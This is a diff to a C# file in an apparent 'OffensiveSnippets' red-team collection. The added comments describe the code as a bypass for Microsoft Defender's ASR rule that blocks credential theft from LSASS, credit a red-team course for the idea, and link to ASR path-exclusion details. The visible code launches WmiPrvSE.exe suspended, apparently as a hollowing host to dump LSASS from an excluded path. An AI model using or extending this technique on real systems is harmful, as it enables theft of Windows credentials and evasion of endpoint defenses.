@@ -1,3 +1,6 @@
+// This is a bypass to dump LSASS with ASR rules enabled "Block credential stealing from the Windows local security authority subsystem (lsass.exe)"
+// To enable the ASR rule: Set-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions Enable
+// 11/23/2022
 using System;
 using System.Runtime.InteropServices;
 
@@ -83,6 +86,9 @@ namespace OffensiveSnippets {
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             
+            // The idea was taken from RTO2, thanks to Rasta.
+            // For more information about path exclusions, check the following url.
+            // https://github.com/HackingLZ/ExtractedDefender/blob/main/asr/9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2
             bool res = CreateProcess(null, "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", IntPtr.Zero, IntPtr.Zero,
                 false, 0x4, IntPtr.Zero, null, ref si, out pi);
             PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
